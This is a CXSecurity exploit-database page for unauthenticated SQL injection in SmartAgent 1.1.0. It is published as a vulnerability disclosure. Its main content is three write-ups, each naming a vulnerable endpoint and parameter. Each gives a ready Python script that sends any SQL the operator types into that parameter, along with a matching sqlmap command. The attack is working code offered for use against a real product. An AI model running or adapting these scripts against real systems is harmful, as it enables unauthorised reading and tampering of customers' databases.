---
title: SmartAgent 1.1.0 SQL Injection
url: https://cxsecurity.com/issue/WLB-2024110001
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-11-03
fetch_date: 2025-10-06T19:13:53.441731
---

# SmartAgent 1.1.0 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **SmartAgent 1.1.0 SQL Injection** **2024.11.02**  Credit:  **[Alter Prime](https://cxsecurity.com/author/Alter%2BPrime/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

# Exploit Title: SmartAgent v1.1.0 - Unauthenticated SQL Injection (SQLi)
# Date: 01-10-2024
# Exploit Author: Alter Prime
# Vendor Homepage: https://smarts-srlcom.com/, https://smartagent.com
# Version: Build v1.1.0
# Tested on: Kali Linux
An unauthenticated user can inject SQL queries through a POST request to the vulnerable script https://smarts-srlcom.com/privateArea/common/tests/interface.php.
The POST request includes the folowing parameters "action=exportNetworkDate&id=1111" and vulnerable parameter is "id".
Steps To Reproduce:
1. Run the below python script on a vulnerable web application instance of SmartAgent v1.1.0
#Python Exploit
import requests
url = "https://smartagent.[client].com/privateArea/common/tests/interface.php"
sqlcommand = input("Enter the command you want to run \(EX: UNION SELECT @@version\): ")
postdata = {
"action": "exportNetworkDate",
"id": "1111" + sqlcommand
}
response = requests.post(url, data=postdata, verify=False)
print(response.text)
2. Alternatively SQLMAP could pe used on the same endpoint
sqlmap -u https://smartagent.[client].com/privateArea/common/tests/interface.php. --data "action=exportNetworkDate&id=1111" -p "id"
# Exploit Title: SmartAgent v1.1.0 - Unauthenticated SQL Injection (SQLi)
# Date: 01-10-2024
# Exploit Author: Alter Prime
# Vendor Homepage: https://smarts-srlcom.com/, https://smartagent.com
# Version: Build v1.1.0
# Tested on: Kali Linux
An unauthenticated user can inject SQL queries through a GET request to the vulnerable script https://smarts-srlcom.com/privateArea/common/qoe/sendPushManually.php?id=123.
The GET request includes the vulnerable parameter "id".
Steps To Reproduce:
1. Run the below python script on a vulnerable web application instance of SmartAgent v1.1.0
#Python Exploit
import requests
url = "https://smartagent.[client].com/privateArea/common/qoe/sendPushManually.php"
sqlcommand = input("Enter the command you want to run \(EX: UNION SELECT @@version\): ")
parameter = {
"id": "123" + sqlcommand
}
response = requests.get(url, data=parameter, verify=False)
print(response.text)
2. Alternatively SQLMAP could pe used on the same endpoint
sqlmap -u https://smartagent.[client].com/privateArea/common/qoe/sendPushManually.php?id=123 -p "id"
# Exploit Title: SmartAgent v1.1.0 - Unauthenticated SQL Injection (SQLi)
# Date: 01-10-2024
# Exploit Author: Alter Prime
# Vendor Homepage: https://smarts-srlcom.com/, https://smartagent.com
# Version: Build v1.1.0
# Tested on: Kali Linux
An unauthenticated user can inject SQL queries through a GET request to the vulnerable script https://smarts-srlcom.com/recuperaLog.php?client=1111.
The GET request includes the vulnerable parameter "client".
Steps To Reproduce:
1. Run the below python script on a vulnerable web application instance of SmartAgent v1.1.0
#Python Exploit
import requests
url = "https://smartagent.[client].com/recuperaLog.php"
sqlcommand = input("Enter the command you want to run \(EX: UNION SELECT @@version\): ")
parameter = {
"client": "1111" + sqlcommand
}
response = requests.get(url, data=parameter, verify=False)
print(response.text)
2. Alternatively SQLMAP could pe used on the same endpoint
sqlmap -u https://smartagent.[client].com/recuperaLog.php?client=1111 -p "client"

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024110001)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top